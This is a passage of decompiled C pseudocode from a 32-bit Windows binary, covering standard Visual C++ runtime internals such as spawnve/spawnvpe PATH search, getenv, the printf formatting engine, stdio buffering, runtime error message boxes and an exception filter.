      *(_DWORD *)(v1 + 12) = 0;
      *(_DWORD *)(v1 + 8) = 0;
      *(_DWORD *)v1 = 0;
      *(_DWORD *)(v1 + 28) = 0;
    }
  }
  return v1;
}

//----- (00402D64) --------------------------------------------------------
int __cdecl spawnvpe(int a1, const char *a2, const char *const *a3, const char *const *a4)
{
  int v4; // edi@4
  int v5; // eax@5
  int v6; // esi@5
  int v7; // ST0C_4@6
  int v8; // ST10_4@6
  int v9; // ST14_4@6
  int v10; // edi@8
  char v11; // zf@9
  int v13; // eax@1
  int v14; // eax@4
  int v15; // edi@13
  int v16; // eax@14
  int v17; // eax@21
  int v18; // [sp+0h] [bp-8h]@1
  int v19; // [sp+4h] [bp-4h]@20

  v13 = spawnve(a1, a2, a3, a4);
  v18 = v13;
  if ( v13 == -1 )
  {
    if ( errno == 2 )
    {
      if ( !mbschr((unsigned __int16 *)a2, 47) )
      {
        v14 = getenv((int)"PATH");
        v4 = v14;
        if ( v14 )
        {
          v5 = malloc(0x104u);
          v6 = v5;
          if ( v5 )
          {
            v9 = 259;
            v8 = v5;
            v7 = v4;
            while ( 1 )
            {
              v17 = getpath(v7, v8, v9);
              v19 = v17;
              if ( !v17 )
                break;
              if ( !*(_BYTE *)v6 )
                break;
              v10 = strlen(v6) + v6 - 1;
              if ( *(_BYTE *)v10 != 92 )
                v11 = *(_BYTE *)v10 == 47;
              else
                v11 = v10 == mbsrchr(v6, 92);
              if ( !v11 )
                strcat(v6, (int)L"\\");
              v15 = strlen(v6);
              if ( (unsigned int)(strlen((int)a2) + v15) >= 0x104 )
                break;
              strcat(v6, (int)a2);
              v16 = spawnve(a1, (const char *)v6, a3, a4);
              v18 = v16;
              if ( v16 != -1 )
                break;
              if ( errno != 2
                && (v6 != mbschr((unsigned __int16 *)v6, 92) && v6 != mbschr((unsigned __int16 *)v6, 47)
                 || v6 + 1 != mbschr((unsigned __int16 *)(v6 + 1), 92)
                 && v6 + 1 != mbschr((unsigned __int16 *)(v6 + 1), 47)) )
                break;
              v9 = 259;
              v8 = v6;
              v7 = v19;
            }
            free(v6);
          }
        }
      }
    }
  }
  return v18;
}

//----- (00402EC7) --------------------------------------------------------
signed int __cdecl comexecmd(int a1, LPCSTR lpApplicationName, int a3, int a4)
{
  signed int result; // eax@1
  signed int v5; // esi@3
  int v6; // [sp+4h] [bp-4h]@1
  LPVOID lpEnvironment; // [sp+0h] [bp-8h]@1

  result = cenvarg((int *)a3, (int *)a4, &v6, (int)&lpEnvironment);
  if ( result != -1 )
  {
    v5 = dospawn(a1, lpApplicationName, v6, lpEnvironment);
    free(v6);
    free((int)lpEnvironment);
    result = v5;
  }
  return result;
}

//----- (00402F1A) --------------------------------------------------------
int __cdecl spawnve(int a1, const char *a2, const char *const *a3, const char *const *a4)
{
  int v4; // eax@1
  int v5; // ebx@1
  const char *v6; // edi@1
  int v7; // esi@1
  int v8; // eax@4
  int v9; // eax@12
  int v10; // ebx@12
  char (**v12)[5]; // ebx@14
  int v13; // esi@14
  int v14; // eax@3
  int v15; // eax@4
  int v16; // eax@12
  int v17; // [sp+Ch] [bp-8h]@9
  char *v18; // [sp+10h] [bp-4h]@12

  v5 = (int)a2;
  v6 = a2;
  v7 = mbsrchr((int)a2, 92);
  v4 = mbsrchr(v5, 47);
  if ( v4 )
  {
    if ( !v7 || v4 > (unsigned int)v7 )
      v7 = v4;
  }
  else
  {
    if ( !v7 )
    {
      v14 = mbschr((unsigned __int16 *)v5, 58);
      v7 = v14;
      if ( !v14 )
      {
        v15 = strlen(v5);
        v8 = malloc(v15 + 3);
        v6 = (const char *)v8;
        if ( !v8 )
          return -1;
        strcpy(v8);
        strcat((int)v6, v5);
        v7 = (int)(v6 + 2);
      }
    }
  }
  v17 = -1;
  if ( !mbsrchr(v7, 46) )
  {
    v16 = strlen((int)v6);
    v9 = malloc(v16 + 5);
    v10 = v9;
    v18 = (char *)v9;
    if ( v9 )
    {
      strcpy(v9);
      v13 = v10 + strlen((int)v6);
      v12 = &off_40B0D0;
      while ( 1 )
      {
        strcpy(v13);
        if ( access(v18, 0) != -1 )
          break;
        --v12;
        if ( (signed int)v12 < (signed int)&ext_strings )
          goto LABEL_19;
      }
      v17 = comexecmd(a1, v18, (int)a3, (int)a4);
LABEL_19:
      free((int)v18);
      v5 = (int)a2;
      goto LABEL_20;
    }
    return -1;
  }
  if ( access(v6, 0) != -1 )
    v17 = comexecmd(a1, v6, (int)a3, (int)a4);
LABEL_20:
  if ( v6 != (const char *)v5 )
    free((int)v6);
  return v17;
}

//----- (00403063) --------------------------------------------------------
int __cdecl access(const char *a1, int a2)
{
  DWORD v2; // eax@1
  int v4; // eax@2

  v2 = GetFileAttributesA(a1);
  if ( v2 == -1 )
  {
    v4 = GetLastError();
    dosmaperr(v4);
    return -1;
  }
  if ( v2 & 1 && a2 & 2 )
  {
    errno = 13;
    doserrno = 5;
    return -1;
  }
  return 0;
}

//----- (004030A7) --------------------------------------------------------
int __cdecl getenv(int a1)
{
  LPVOID v1; // esi@1
  int result; // eax@2
  const CHAR *v3; // ebx@7
  unsigned int v4; // edi@8

  v1 = environ;
  if ( _env_initialized )
  {
    if ( environ || wenviron != (_DWORD)environ && !_wtomb_environ() && (v1 = environ, environ) )
    {
      v3 = (const CHAR *)a1;
      if ( a1 )
      {
        v4 = strlen(a1);
        while ( *(_DWORD *)v1 )
        {
          if ( strlen(*(_DWORD *)v1) > v4 && *(_BYTE *)(*(_DWORD *)v1 + v4) == 61 && !mbsnbicoll(*(LPCSTR *)v1, v3, v4) )
            return *(_DWORD *)v1 + v4 + 1;
          v1 = (char *)v1 + 4;
        }
      }
    }
    result = 0;
  }
  else
  {
    result = 0;
  }
  return result;
}

//----- (00403128) --------------------------------------------------------
signed int __cdecl flsbuf(unsigned __int8 a1, int a2)
{
  int v2; // eax@1
  int v3; // ebx@1
  int v4; // esi@1
  const void *v5; // eax@12
  unsigned int v6; // edi@12
  int v7; // eax@15
  int v9; // eax@6
  int v10; // eax@6
  int v11; // edi@12

  v4 = a2;
  v2 = *(_DWORD *)(a2 + 12);
  v3 = *(_DWORD *)(a2 + 16);
  if ( !(v2 & 0x82) || v2 & 0x40 )
    goto LABEL_24;
  if ( v2 & 1 )
  {
    *(_DWORD *)(a2 + 4) = 0;
    if ( v2 & 0x10 )
    {
      *(_DWORD *)a2 = *(_DWORD *)(a2 + 8);
      *(_DWORD *)(a2 + 12) = v2 & 0xFFFFFFFE;
      goto LABEL_6;
    }
LABEL_24:
    *(_DWORD *)(a2 + 12) = v2 | 0x20;
    return -1;
  }
LABEL_6:
  v9 = *(_DWORD *)(a2 + 12);
  *(_DWORD *)(a2 + 4) = 0;
  a2 = 0;
  v10 = v9 & 0xFFFFFFEF | 2;
  *(_DWORD *)(v4 + 12) = v10;
  if ( !(v10 & 0x10C) )
  {
    if ( v4 != (_DWORD)&unk_40B100 && v4 != (_DWORD)&unk_40B120 || !isatty(v3) )
      getbuf(v4);
  }
  if ( *(_WORD *)(v4 + 12) & 0x108 )
  {
    v5 = *(const void **)(v4 + 8);
    v11 = *(_DWORD *)v4;
    *(_DWORD *)v4 = (char *)v5 + 1;
    v6 = v11 - (_DWORD)v5;
    *(_DWORD *)(v4 + 4) = *(_DWORD *)(v4 + 24) - 1;
    if ( (signed int)v6 <= 0 )
    {
      if ( v3 == -1 )
        v7 = (int)&_badioinfo;
      else
        v7 = _pioinfo[v3 >> 5] + 8 * (v3 & 0x1F);
      if ( *(_BYTE *)(v7 + 4) & 0x20 )
        lseek(v3, 0, 2);
    }
    else
    {
      a2 = write(v3, v5, v6);
    }
    **(_BYTE **)(v4 + 8) = a1;
  }
  else
  {
    v6 = 1;
    a2 = write(v3, &a1, 1u);
  }
  if ( a2 == v6 )
    return a1;
  *(_DWORD *)(v4 + 12) |= 0x20u;
  return -1;
}

//----- (0040323E) --------------------------------------------------------
unsigned __int8 __usercall write_char<al>(unsigned __int8 a1<al>, int a2<ecx>, int a3<esi>)
{
  char v3; // sf@3

  if ( *(_BYTE *)(a2 + 12) & 0x40 && !*(_DWORD *)(a2 + 8)
    || ((v3 = *(_DWORD *)(a2 + 4) < 1, --*(_DWORD *)(a2 + 4), v3) ? (*(_DWORD *)&a1 = flsbuf(a1, a2)) : (**(_BYTE **)a2 = a1, ++*(_DWORD *)a2, *(_DWORD *)&a1 = a1), a1 != -1) )
    ++*(_DWORD *)a3;
  else
    *(_DWORD *)a3 |= a1;
  return a1;
}

//----- (00403271) --------------------------------------------------------
char __usercall write_multi_char<al>(int a1<eax>, unsigned __int8 a2, int a3, int a4)
{
  int v4; // esi@1

  v4 = a1;
  do
  {
    if ( a3 <= 0 )
      break;
    --a3;
    LOBYTE(a1) = write_char(a2, a4, v4);
  }
  while ( *(_DWORD *)v4 != -1 );
  return a1;
}

//----- (00403295) --------------------------------------------------------
char __usercall write_string<al>(int a1<eax>, unsigned __int8 *a2<ecx>, int a3<edi>, int a4)
{
  unsigned __int8 *v4; // ebx@1
  int v5; // esi@1
  unsigned __int8 v6; // al@4

  v5 = a1;
  v4 = a2;
  if ( !(*(_BYTE *)(a3 + 12) & 0x40) || *(_DWORD *)(a3 + 8) )
  {
    do
    {
      if ( a4 <= 0 )
        break;
      v6 = *v4;
      --a4;
      LOBYTE(a1) = write_char(v6, a3, v5);
      ++v4;
    }
    while ( *(_DWORD *)v5 != -1 );
  }
  else
  {
    LOBYTE(a1) = a4;
    *(_DWORD *)v5 += a4;
  }
  return a1;
}

//----- (004032CC) --------------------------------------------------------
int __cdecl output(int a1, int a2, int a3)
{
  int v3; // ecx@1
  unsigned __int8 v4; // bl@1
  int v5; // edi@2
  int v6; // edi@4
  int v7; // eax@7
  unsigned __int8 v8; // al@37
  signed int v9; // ecx@63
  int v10; // eax@65
  unsigned __int8 *v11; // eax@68
  CHAR *v12; // esi@70
  __int64 v13; // qax@83
  int v14; // eax@86
  unsigned __int8 *v15; // ecx@87
  int v16; // eax@88
  int v17; // ST10_4@91
  int v18; // eax@98
  int v19; // edi@101
  unsigned __int8 *v20; // eax@125
  int v21; // eax@136
  int v22; // ebx@152
  int v23; // edi@152
  char *v24; // esi@160
  signed int v25; // ecx@163
  int v26; // eax@166
  int v27; // esi@166
  char v28; // bl@172
  int v29; // esi@180
  int v30; // edi@182
  const WCHAR *v31; // ebx@187
  int v32; // eax@188
  int v34; // eax@9
  int v35; // eax@22
  int v36; // eax@27
  int v37; // eax@75
  int v38; // ecx@101
  int v39; // eax@101
  int v40; // eax@114
  int v41; // eax@115
  int v42; // eax@116
  __int64 v43; // qax@151
  int v44; // eax@161
  unsigned __int64 v45; // ST04_8@163
  int v46; // [sp+3Ch] [bp-48h]@1
  int v47; // [sp+38h] [bp-4Ch]@1
  int v48; // [sp+24h] [bp-60h]@1
  int v49; // [sp+14h] [bp-70h]@3
  int v50; // [sp+44h] [bp-40h]@10
  signed int v51; // [sp+18h] [bp-6Ch]@10
  signed int v52; // [sp+20h] [bp-64h]@10
  int v53; // [sp+2Ch] [bp-58h]@10
  int v54; // [sp+30h] [bp-54h]@10
  int v55; // [sp+48h] [bp-3Ch]@10
  signed int v56; // [sp+28h] [bp-5Ch]@10
  unsigned __int8 *v57; // [sp+40h] [bp-44h]@65
  CHAR UsedDefaultChar; // [sp+4Ch] [bp-38h]@70
  int v59; // [sp+8h] [bp-7Ch]@101
  int v60; // [sp+4h] [bp-80h]@101
  signed int v61; // [sp+1Ch] [bp-68h]@118
  char v62; // [sp+34h] [bp-50h]@133
  char v63; // [sp+35h] [bp-4Fh]@133
  char v64; // [sp+24Bh] [bp+1C7h]@160
  int v65; // [sp+10h] [bp-74h]@163
  char v66; // [sp+24Ch] [bp+1C8h]@188

  v46 = 0;
  v47 = 0;
  v48 = 0;
  v4 = *(_BYTE *)a2;
  v3 = 0;
  if ( *(_BYTE *)a2 )
  {
    v5 = a2;
    while ( 1 )
    {
      v6 = v5 + 1;
      a2 = v6;
      if ( v47 < 0 )
        return v47;
      if ( (char)v4 < 32 || (char)v4 > 120 )
        v7 = 0;
      else
        v7 = a_com[(char)v4 + 4] & 0xF;
      v34 = *(&_lookuptable[8 * v7] + v3) >> 4;
      v49 = v34;
      switch ( v34 )
      {
        case 1:
          v50 = -1;
          v51 = 0;
          v52 = 0;
          v53 = 0;
          v54 = 0;
          v55 = 0;
          v56 = 0;
          goto LABEL_196;
        case 2:
          switch ( v4 )
          {
            case 0x20u:
              v55 |= 2u;
              break;
            case 0x23u:
              LOBYTE(v55) = (_BYTE)v55 | 0x80;
              break;
            case 0x2Bu:
              v55 |= 1u;
              break;
            case 0x2Du:
              v55 |= 4u;
              break;
            case 0x30u:
              v55 |= 8u;
              break;
          }
          goto LABEL_196;
        case 3:
          if ( v4 == 42 )
          {
            a3 += 4;
            v35 = *(_DWORD *)(a3 - 4);
            v53 = *(_DWORD *)(a3 - 4);
            if ( v35 < 0 )
            {
              v55 |= 4u;
              v53 = -v53;
            }
          }
          else
          {
            v53 = (char)v4 + 10 * v53 - 48;
          }
          goto LABEL_196;
        case 4:
          v50 = 0;
          goto LABEL_196;
        case 5:
          if ( v4 == 42 )
          {
            a3 += 4;
            v36 = *(_DWORD *)(a3 - 4);
            v50 = *(_DWORD *)(a3 - 4);
            if ( v36 < 0 )
              v50 = -1;
          }
          else
          {
            v50 = (char)v4 + 10 * v50 - 48;
          }
          goto LABEL_196;
        case 6:
          switch ( v4 )
          {
            case 0x49u:
              v8 = *(_BYTE *)v6;
              if ( *(_BYTE *)v6 != 54 || *(_BYTE *)(v6 + 1) != 52 )
              {
                if ( v8 != 51 || *(_BYTE *)(v6 + 1) != 50 )
                {
                  if ( v8 != 100 && v8 != 105 && v8 != 111 && v8 != 117 && v8 != 120 && v8 != 88 )
                  {
                    v49 = 0;
                    goto LABEL_50;
                  }
                }
                else
                {
                  BYTE1(v55) &= 0x7Fu;
                  a2 = v6 + 2;
                }
              }
              else
              {
                BYTE1(v55) |= 0x80u;
                a2 = v6 + 2;
              }
              break;
            case 0x68u:
              v55 |= 0x20u;
              break;
            case 0x6Cu:
              v55 |= 0x10u;
              break;
            case 0x77u:
              BYTE1(v55) |= 8u;
              break;
          }
          goto LABEL_196;
        case 0:
LABEL_50:
          v56 = 0;
          if ( HIBYTE((*pctype)[v4]) & 0x80 )
          {
            write_char(v4, a1, (int)&v47);
            v4 = *(_BYTE *)v6;
            a2 = v6 + 1;
          }
          write_char(v4, a1, (int)&v47);
          goto LABEL_196;
        case 7:
          if ( (char)v4 <= 103 )
          {
            if ( (char)v4 >= 101 )
              goto LABEL_70;
            if ( (char)v4 > 88 )
            {
              if ( (char)v4 == 90 )
              {
                a3 += 4;
                v14 = *(_DWORD *)(a3 - 4);
                if ( v14 )
                {
                  v15 = *(unsigned __int8 **)(v14 + 4);
                  if ( v15 )
                  {
                    v16 = *(_WORD *)v14;
                    v57 = v15;
                    if ( BYTE1(v55) & 8 )
                    {
                      v16 /= 2;
                      v56 = 1;
                    }
                    else
                    {
                      v56 = 0;
                    }
                    goto LABEL_170;
                  }
                }
                v57 = (unsigned __int8 *)_nullstring;
                v17 = (int)_nullstring;
LABEL_110:
                v16 = strlen(v17);
LABEL_170:
                v46 = v16;
                goto LABEL_171;
              }
              if ( (char)v4 == 99 )
                goto LABEL_74;
              if ( (char)v4 != 100 )
                goto LABEL_171;
LABEL_80:
              v55 |= 0x40u;
LABEL_81:
              v46 = 10;
              goto LABEL_82;
            }
            if ( (char)v4 != 88 )
            {
              if ( (char)v4 != 67 )
              {
                if ( (char)v4 == 69 || (char)v4 == 71 )
                {
                  v51 = 1;
                  v4 += 32;
LABEL_70:
                  v55 |= 0x40u;
                  v12 = &UsedDefaultChar;
                  v57 = (unsigned __int8 *)&UsedDefaultChar;
                  if ( v50 >= 0 )
                  {
                    if ( v50 )
                    {
                      if ( v50 > 512 )
                        v50 = 512;
                      if ( v50 > 163 )
                      {
                        v18 = malloc(v50 + 349);
                        v48 = v18;
                        if ( v18 )
                        {
                          v57 = (unsigned __int8 *)v18;
                          v12 = (CHAR *)v18;
                        }
                        else
                        {
                          v50 = 163;
                        }
                      }
                    }
                    else
                    {
                      if ( v4 == 103 )
                        v50 = 1;
                    }
                  }
                  else
                  {
                    v50 = 6;
                  }
                  v38 = *(_DWORD *)a3;
                  v39 = a3 + 8;
                  a3 += 8;
                  v59 = *(_DWORD *)(v39 - 4);
                  v60 = v38;
                  cfltcvt_tab(&v60, v12, (char)v4, v50, v51);
                  v19 = v55 & 0x80;
                  if ( v55 & 0x80 )
                  {
                    if ( !v50 )
                      off_40B618(v12);
                  }
                  if ( v4 == 103 )
                  {
                    if ( !v19 )
                      off_40B610(v12);
                  }
                  if ( *v12 == 45 )
                  {
                    BYTE1(v55) |= 1u;
                    ++v12;
                    v57 = (unsigned __int8 *)v12;
                  }
                  v17 = (int)v12;
                  goto LABEL_110;
                }
                if ( (char)v4 != 83 )
                  goto LABEL_171;
                if ( !(v55 & 0x830) )
                  BYTE1(v55) |= 8u;
LABEL_63:
                v9 = v50;
                if ( v50 == -1 )
                  v9 = 2147483647;
                a3 += 4;
                v10 = *(_DWORD *)(a3 - 4);
                v57 = *(unsigned __int8 **)(a3 - 4);
                if ( v55 & 0x810 )
                {
                  if ( !v10 )
                    v57 = (unsigned __int8 *)_wnullstring;
                  v11 = v57;
                  v56 = 1;
                  while ( v9 )
                  {
                    --v9;
                    if ( !*(_WORD *)v11 )
                      break;
                    v11 += 2;
                  }
                  v16 = (signed int)(v11 - v57) >> 1;
                }
                else
                {
                  if ( !v10 )
                    v57 = (unsigned __int8 *)_nullstring;
                  v20 = v57;
                  while ( v9 )
                  {
                    --v9;
                    if ( !*v20 )
                      break;
                    ++v20;
                  }
                  v16 = v20 - v57;
                }
                goto LABEL_170;
              }
              if ( !(v55 & 0x830) )
                BYTE1(v55) |= 8u;
LABEL_74:
              a3 += 4;
              if ( v55 & 0x810 )
              {
                v37 = wctomb(&UsedDefaultChar, *(_WORD *)(a3 - 4));
                v46 = v37;
                if ( v37 < 0 )
                  v52 = 1;
              }
              else
              {
                UsedDefaultChar = *(_BYTE *)(a3 - 4);
                v46 = 1;
              }
              v57 = (unsigned __int8 *)&UsedDefaultChar;
              goto LABEL_171;
            }
            goto LABEL_131;
          }
          if ( (char)v4 == 105 )
            goto LABEL_80;
          if ( (char)v4 == 110 )
          {
            a3 += 4;
            v21 = *(_DWORD *)(a3 - 4);
            if ( v55 & 0x20 )
              *(_WORD *)v21 = v47;
            else
              *(_DWORD *)v21 = v47;
            v52 = 1;
            goto LABEL_194;
          }
          if ( (char)v4 != 111 )
          {
            v40 = (char)v4 - 112;
            if ( v40 )
            {
              v41 = (char)v4 - 115;
              if ( !v41 )
                goto LABEL_63;
              v42 = (char)v4 - 117;
              if ( !v42 )
                goto LABEL_81;
              if ( (char)v4 != 120 )
                goto LABEL_171;
              v61 = 39;
              goto LABEL_132;
            }
            v50 = 8;
LABEL_131:
            v61 = 7;
LABEL_132:
            v46 = 16;
            if ( v55 & 0x80 )
            {
              v62 = 48;
              v63 = (_BYTE)v61 + 81;
              v54 = 2;
            }
            goto LABEL_82;
          }
          v46 = 8;
          if ( v55 & 0x80 )
            BYTE1(v55) |= 2u;
LABEL_82:
          if ( v55 & 0x8000 )
          {
            v13 = *(_QWORD *)a3;
            a3 += 8;
            goto LABEL_147;
          }
          a3 += 4;
          if ( v55 & 0x20 )
          {
            if ( v55 & 0x40 )
              *(_DWORD *)&v13 = *(_WORD *)(a3 - 4);
            else
              *(_DWORD *)&v13 = *(_WORD *)(a3 - 4);
LABEL_143:
            v13 = (signed int)v13;
            goto LABEL_147;
          }
          *(_DWORD *)&v13 = *(_DWORD *)(a3 - 4);
          if ( v55 & 0x40 )
            goto LABEL_143;
          *((_DWORD *)&v13 + 1) = 0;
LABEL_147:
          if ( v55 & 0x40 )
          {
            if ( *((_DWORD *)&v13 + 1) <= 0 )
            {
              if ( *((_DWORD *)&v13 + 1) < 0 )
              {
                *(_DWORD *)&v43 = -(_DWORD)v13;
                v13 = -v43;
                BYTE1(v55) |= 1u;
              }
            }
          }
          v22 = v13;
          v23 = *((_DWORD *)&v13 + 1);
          if ( !(v55 & 0x8000) )
            v23 = 0;
          if ( v50 >= 0 )
          {
            v55 &= 0xFFFFFFF7u;
            if ( v50 > 512 )
              v50 = 512;
          }
          else
          {
            v50 = 1;
          }
          if ( !(v23 | (_DWORD)v13) )
            v54 = 0;
          v24 = &v64;
          while ( 1 )
          {
            v44 = v50--;
            if ( v44 <= 0 )
            {
              if ( !(v23 | v22) )
                break;
            }
            *((_DWORD *)&v45 + 1) = v23;
            *(_DWORD *)&v45 = v22;
            v25 = (unsigned int)(v45 % v46) + 48;
            v65 = v45 % v46 >> 32;
            v22 = v45 / v46;
            v23 = v45 / v46 >> 32;
            if ( v25 > 57 )
              v25 += v61;
            *v24-- = v25;
          }
          v26 = &v64 - v24;
          v27 = (int)(v24 + 1);
          v46 = v26;
          v57 = (unsigned __int8 *)v27;
          if ( BYTE1(v55) & 2 && (*(_BYTE *)v27 != 48 || !v26) )
          {
            --v57;
            *v57 = 48;
            v16 = v26 + 1;
            goto LABEL_170;
          }
LABEL_171:
          if ( !v52 )
          {
            v28 = v55;
            if ( v55 & 0x40 )
            {
              if ( BYTE1(v55) & 1 )
              {
                v62 = 45;
                goto LABEL_179;
              }
              if ( v55 & 1 )
              {
                v62 = 43;
                goto LABEL_179;
              }
              if ( v55 & 2 )
              {
                v62 = 32;
LABEL_179:
                v54 = 1;
              }
            }
            v29 = v53 - v54 - v46;
            if ( !(v55 & 0xC) )
              write_multi_char((int)&v47, 0x20u, v53 - v54 - v46, a1);
            v30 = a1;
            write_string((int)&v47, (unsigned __int8 *)&v62, a1, v54);
            if ( v28 & 8 )
            {
              if ( !(v28 & 4) )
                write_multi_char((int)&v47, 0x30u, v29, v30);
            }
            if ( v56 && v46 > 0 )
            {
              v31 = (const WCHAR *)v57;
              v65 = v46;
              do
              {
                --v65;
                v32 = wctomb(&v66, *v31);
                ++v31;
                if ( v32 <= 0 )
                  break;
                write_string((int)&v47, (unsigned __int8 *)&v66, a1, v32);
              }
              while ( v65 );
            }
            else
            {
              write_string((int)&v47, v57, v30, v46);
            }
            if ( v55 & 4 )
              write_multi_char((int)&v47, 0x20u, v29, a1);
          }
LABEL_194:
          if ( v48 )
          {
            free(v48);
            v48 = 0;
          }
LABEL_196:
          v5 = a2;
          v4 = *(_BYTE *)a2;
          if ( !*(_BYTE *)a2 )
            return v47;
          v3 = v49;
          break;
        default:
          goto LABEL_196;
      }
    }
  }
  return v47;
}

//----- (00403AC6) --------------------------------------------------------
signed int __cdecl stbuf(int a1)
{
  int v1; // esi@1
  signed int v2; // eax@3
  int v3; // edi@7
  int v5; // eax@8
  int v6; // edi@10

  v1 = a1;
  if ( !isatty(*(_DWORD *)(a1 + 16)) )
    return 0;
  if ( v1 == (_DWORD)&unk_40B100 )
  {
    v2 = 0;
  }
  else
  {
    if ( v1 != (_DWORD)&unk_40B120 )
      return 0;
    v2 = 1;
  }
  ++cflush;
  if ( *(_WORD *)(v1 + 12) & 0x10C )
    return 0;
  v3 = 4 * v2 + 4241388;
  if ( *(_DWORD *)&stdbuf[4 * v2] || (v5 = malloc(0x1000u), *(_DWORD *)v3 = v5, v5) )
  {
    v6 = *(_DWORD *)v3;
    *(_DWORD *)(v1 + 8) = v6;
    *(_DWORD *)v1 = v6;
    *(_DWORD *)(v1 + 24) = 4096;
    *(_DWORD *)(v1 + 4) = 4096;
  }
  else
  {
    *(_DWORD *)(v1 + 8) = v1 + 20;
    *(_DWORD *)v1 = v1 + 20;
    *(_DWORD *)(v1 + 24) = 2;
    *(_DWORD *)(v1 + 4) = 2;
  }
  *(_WORD *)(v1 + 12) |= 0x1102u;
  return 1;
}

//----- (00403B4E) --------------------------------------------------------
signed int __cdecl ftbuf(int a1, int a2)
{
  int v2; // esi@2
  signed int result; // eax@3

  if ( a1 )
  {
    v2 = a2;
    if ( *(_BYTE *)(a2 + 13) & 0x10 )
    {
      result = flush(a2);
      *(_BYTE *)(v2 + 13) &= 0xEEu;
      *(_DWORD *)(v2 + 24) = 0;
      *(_DWORD *)v2 = 0;
      *(_DWORD *)(v2 + 8) = 0;
    }
  }
  else
  {
    result = a2;
    if ( *(_BYTE *)(a2 + 13) & 0x10 )
      result = flush(a2);
  }
  return result;
}

//----- (00403B8A) --------------------------------------------------------
signed int __cdecl _initstdio()
{
  signed int v0; // eax@1
  int v1; // eax@6
  signed int result; // eax@8
  int v3; // edx@9
  void **v4; // ecx@9
  signed int v5; // edx@12
  signed int v6; // ecx@12
  signed int v7; // eax@13

  v0 = nstream;
  if ( !nstream )
  {
    v0 = 512;
LABEL_5:
    nstream = v0;
    goto LABEL_6;
  }
  if ( nstream < 20 )
  {
    v0 = 20;
    goto LABEL_5;
  }
LABEL_6:
  v1 = calloc(v0, 4);
  _piob = v1;
  if ( v1 || (nstream = 20, v1 = calloc(20, 4), _piob = v1, v1) )
  {
    v3 = 0;
    v4 = &iob;
    while ( 1 )
    {
      *(_DWORD *)(v3 + v1) = v4;
      v4 += 8;
      v3 += 4;
      if ( (signed int)v4 >= (signed int)rterrs )
        break;
      v1 = _piob;
    }
    v5 = 0;
    v6 = (signed int)&unk_40B0F0;
    do
    {
      v7 = *(_DWORD *)(_pioinfo[v5 >> 5] + 8 * (v5 & 0x1F));
      if ( v7 == -1 || !v7 )
        *(_DWORD *)v6 = -1;
      v6 += 32;
      ++v5;
    }
    while ( v6 < (signed int)&unk_40B150 );
    result = 0;
  }
  else
  {
    result = 26;
  }
  return result;
}

//----- (00403C30) --------------------------------------------------------
int __cdecl _endstdio()
{
  int result; // eax@1

  result = flushall();
  if ( exitflag )
    result = fcloseall();
  return result;
}

//----- (00403C44) --------------------------------------------------------
int __thiscall ismbcspace(int this, int MultiByteStr)
{
  int result; // eax@3
  int CharType; // [sp+0h] [bp-4h]@1

  CharType = this;
  if ( (unsigned int)MultiByteStr <= 0xFF )
  {
    if ( _mb_cur_max <= 1 )
      result = LOBYTE((*pctype)[MultiByteStr]) & 8;
    else
      result = isctype(MultiByteStr, MultiByteStr, 8);
  }
  else
  {
    CharType = 0;
    BYTE2(MultiByteStr) = BYTE1(MultiByteStr);
    BYTE3(MultiByteStr) = MultiByteStr;
    result = _ismbcodepage
          && _crtGetStringTypeA(1u, (const CHAR *)&MultiByteStr + 2, 2, (WORD *)&CharType, _mbcodepage, _mblcid, 1)
          && !HIWORD(CharType)
          && CharType & 8;
  }
  return result;
}

//----- (00403CE0) --------------------------------------------------------
__int64 __stdcall allmul(__int64 a1, __int64 a2)
{
  __int64 result; // qax@2

  if ( *((_DWORD *)&a1 + 1) | *((_DWORD *)&a2 + 1) )
    result = a2 * a1;
  else
    result = (unsigned int)a2 * (unsigned int)a1;
  return result;
}

//----- (00403D14) --------------------------------------------------------
int __cdecl NMSG_WRITE(DWORD NumberOfBytesWritten)
{
  int result; // eax@1
  int v2; // esi@4
  CHAR *v3; // edi@11
  int v4; // eax@12
  int *v5; // esi@14
  int v6; // ST20_4@14
  int v7; // ST1C_4@14
  HANDLE v8; // eax@14
  char v9; // [sp+110h] [bp+84h]@9
  CHAR Filename; // [sp+Ch] [bp-80h]@9
  int v11; // [sp+8Ch] [bp+0h]@12
  int v12; // [sp+0h] [bp-8Ch]@13

  result = 0;
  do
  {
    if ( NumberOfBytesWritten == rterrs[2 * result] )
      break;
    ++result;
  }
  while ( (unsigned int)result < 0x13 );
  v2 = 8 * result;
  if ( NumberOfBytesWritten == rterrs[2 * result] )
  {
    result = _error_mode;
    if ( _error_mode != 1 && (_error_mode || _app_type != 1) )
    {
      if ( NumberOfBytesWritten != 252 )
      {
        v9 = 0;
        if ( !GetModuleFileNameA(0, &Filename, 0x104u) )
          strcpy(&Filename);
        v3 = &Filename;
        if ( (unsigned int)(strlen((int)&Filename) + 1) > 0x3C )
        {
          v4 = strlen((int)&Filename);
          v3 = (char *)&v11 + v4 - 187;
          strncpy((int)((char *)&v11 + v4 - 187), (int)"...", 3u);
        }
        strlen((int)v3);
        strlen(*(_DWORD *)&stru_40B364[0].anonymous_0[v2]);
        strcpy(&v12);
        strcat((int)&v12, (int)v3);
        strcat((int)&v12, (int)"\n\n");
        strcat((int)&v12, *(_DWORD *)&stru_40B364[0].anonymous_0[v2]);
        result = _crtMessageBoxA((int)&v12, (int)"Microsoft Visual C++ Runtime Library", 73744);
      }
    }
    else
    {
      v5 = (int *)((char *)stru_40B364 + v2);
      v6 = strlen(*v5);
      v7 = *v5;
      v8 = GetStdHandle(0xFFFFFFF4u);
      result = WriteFile(v8, (LPCVOID)v7, v6, &NumberOfBytesWritten, 0);
    }
  }
  return result;
}

//----- (00403E8B) --------------------------------------------------------
int __cdecl FF_MSGBANNER()
{
  int result; // eax@1
  int v1; // ST00_4@4

  result = _error_mode;
  if ( _error_mode == 1 || !_error_mode && _app_type == 1 )
  {
    NMSG_WRITE(0xFCu);
    if ( adbgmsg )
      adbgmsg(v1);
    result = NMSG_WRITE(0xFFu);
  }
  return result;
}

//----- (00403EC4) --------------------------------------------------------
LONG __cdecl XcptFilter(int a1, struct _EXCEPTION_POINTERS *ExceptionInfo)
{
  unsigned int v2; // ecx@1
  signed int v3; // ebx@8
  LONG result; // eax@10
  signed int v5; // eax@12
  int v6; // edx@14
  int v7; // esi@14
  int v8; // ecx@16
  int v9; // esi@16

  v2 = (unsigned int)&XcptActTab;
  do
  {
    if ( *(_DWORD *)v2 == a1 )
      break;
    v2 += 12;
  }
  while ( v2 < 12 * XcptActTabCount + 4240376 );
  if ( v2 >= 12 * XcptActTabCount + 4240376 || *(_DWORD *)v2 != a1 )
    v2 = 0;
